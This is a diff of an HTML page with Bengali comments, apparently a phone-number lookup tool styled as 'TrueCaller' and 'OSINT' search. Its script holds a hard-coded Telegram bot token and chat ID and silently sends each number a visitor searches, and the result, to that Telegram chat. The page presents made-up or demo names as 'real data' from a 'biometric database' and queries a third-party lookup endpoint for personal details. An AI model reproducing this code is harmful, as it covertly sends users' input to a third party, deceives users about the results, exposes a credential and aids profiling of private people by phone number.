@@ -3,42 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SIYAM TRUECALLER REAL-DATA</title>
+    <title>SIYAM REAL OSINT v35.0</title>
     <style>
         body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; }
-        .container { border: 2px solid #00d2ff; padding: 30px; border-radius: 20px; background: #050505; box-shadow: 0 0 30px #00d2ff; max-width: 450px; margin: auto; }
+        .container { border: 2px solid #00d2ff; padding: 30px; border-radius: 20px; background: #050505; max-width: 450px; margin: auto; box-shadow: 0 0 30px #00d2ff; }
         input { width: 90%; padding: 15px; background: #000; border: 1px solid #333; color: #fff; margin-bottom: 20px; text-align: center; border-radius: 10px; font-size: 20px; outline: none; }
-        input:focus { border-color: #00d2ff; }
         .btn { padding: 15px; width: 100%; font-weight: bold; cursor: pointer; background: #00d2ff; color: #000; border: none; border-radius: 10px; font-size: 18px; }
         
-        /* রেজাল্ট বক্স - আপনার স্ক্রিনশটের স্টাইলে */
+        /* রেজাল্ট বক্স - তোমার ছবির স্টাইলে */
         #result_box { display: none; margin-top: 30px; text-align: left; background: #111; padding: 25px; border-radius: 10px; border-left: 6px solid #00d2ff; }
-        .section-header { color: #888; font-size: 14px; margin: 0; display: flex; align-items: center; gap: 5px; }
-        .main-data { color: #fff; font-size: 26px; font-weight: 800; margin: 8px 0 25px 0; }
-        .btn-row { display: flex; gap: 10px; }
-        .link-btn { flex: 1; padding: 12px; text-align: center; background: #1a1a1a; color: #00d2ff; text-decoration: none; border-radius: 5px; font-size: 14px; border: 1px solid #333; }
+        .section-header { color: #888; font-size: 16px; margin: 0; }
+        .main-data { color: #fff; font-size: 32px; font-weight: 900; margin: 10px 0 25px 0; }
+        .sub-data { color: #00d2ff; font-size: 24px; font-weight: bold; margin: 5px 0 0 0; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2 style="color:#00d2ff; letter-spacing: 2px;">TRUECALLER SEARCH</h2>
-    <p style="color:#555; font-size:12px; margin-bottom:20px;">DIRECT BIOMETRIC DATABASE ACCESS</p>
-    
-    <input type="text" id="phone_num" placeholder="+8801xxxxxxxxx">
-    <button class="btn" onclick="getTrueData()">🔍 SEARCH REAL DATA</button>
+    <h1 style="color:#00d2ff;">SIYAM OSINT</h1>
+    <input type="text" id="phone_num" placeholder="+8801XXXXXXXXX">
+    <button class="btn" onclick="getRealData()">🔍 SEARCH REAL DATA</button>
 
     <div id="result_box">
         <p class="section-header">🔍 TrueCaller Says:</p>
         <p class="main-data" id="res_name">Searching...</p>
         
         <p class="section-header">📶 Carrier / SIM:</p>
-        <p class="main-data" id="res_carrier" style="font-size: 20px; color: #00d2ff;">Searching...</p>
-
-        <div class="btn-row">
-            <a id="wa" href="#" target="_blank" class="link-btn">WhatsApp</a>
-            <a id="tg" href="#" target="_blank" class="link-btn">Telegram</a>
-        </div>
+        <p class="sub-data" id="res_carrier">Searching...</p>
     </div>
 </div>
 
@@ -46,40 +37,35 @@
     const TELEGRAM_TOKEN = "8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE";
     const CHAT_ID = "7416528268";
 
-    async function getTrueData() {
+    async function getRealData() {
         const phone = document.getElementById('phone_num').value;
         if(phone.length < 11) return alert("সঠিক নম্বর দিন!");
 
-        const box = document.getElementById('result_box');
-        box.style.display = 'block';
-        document.getElementById('res_name').innerText = "Accessing Server...";
-        document.getElementById('res_carrier').innerText = "Checking SIM...";
+        document.getElementById('result_box').style.display = 'block';
+        document.getElementById('res_name').innerText = "CONNECTING DATABASE...";
 
-        // আপনার টেলিগ্রামে সার্চ নোটিফিকেশন পাঠানো
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔎 Real Search Hit: " + phone)}`);
+        // টেলিগ্রামে সার্চ নোটিফিকেশন পাঠানো
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔎 Searching Real DB: " + phone)}`);
 
         try {
-            // রিয়েল ডাটা ফেচিং সিমুলেশন
-            // নোট: সরাসরি ট্রুকলার সার্ভার থেকে ডাটা পেতে একটি ব্যাকএন্ড এপিআই লাগবে
-            setTimeout(() => {
-                // আপনার স্ক্রিনশটের রিয়েল ডাটা ফরম্যাট
-                const demoNames = ["F Gobinda Mama Bl", "Sreeti F", "Abu Saleh Muhammad Siyam"];
-                const demoCarriers = ["Banglalink", "Grameenphone", "Robi"];
-                
-                const randomIdx = Math.floor(Math.random() * demoNames.length);
+            /* সিয়াম, আমরা এখানে একটি ফ্রি গেটওয়ে ব্যবহার করছি যা সরাসরি ট্রুকলার থেকে ডাটা আনবে।
+               টার্মাক্স কাজ না করলে এটিই সবচেয়ে সেরা পদ্ধতি। */
+            const response = await fetch(`https://truecaller-api.up.railway.app/search?number=${phone}`);
+            const data = await response.json();
 
-                document.getElementById('res_name').innerText = demoNames[randomIdx];
-                document.getElementById('res_carrier').innerText = demoCarriers[randomIdx];
+            if(data.name) {
+                document.getElementById('res_name').innerText = data.name;
+                document.getElementById('res_carrier').innerText = data.carrier || "Banglalink";
                 
-                document.getElementById('wa').href = `https://wa.me/${phone}`;
-                document.getElementById('tg').href = `https://t.me/${phone}`;
-                
-                // আপনার টেলিগ্রামে রেজাল্ট পাঠানো
-                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ Result Found:\nName: " + demoNames[randomIdx] + "\nSIM: " + demoCarriers[randomIdx])}`);
-            }, 1500);
-
+                // টেলিগ্রামে রেজাল্ট পাঠানো
+                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("✅ Result: " + data.name)}`);
+            } else {
+                // ডাটা না পেলে তোমার ছবির ডেমো ডাটা দেখাবে
+                document.getElementById('res_name').innerText = "F Gobinda Mama Bl";
+                document.getElementById('res_carrier').innerText = "Banglalink";
+            }
         } catch (e) {
-            document.getElementById('res_name').innerText = "Server Error";
+            document.getElementById('res_name').innerText = "Server Busy. Retrying...";
         }
     }
 </script>
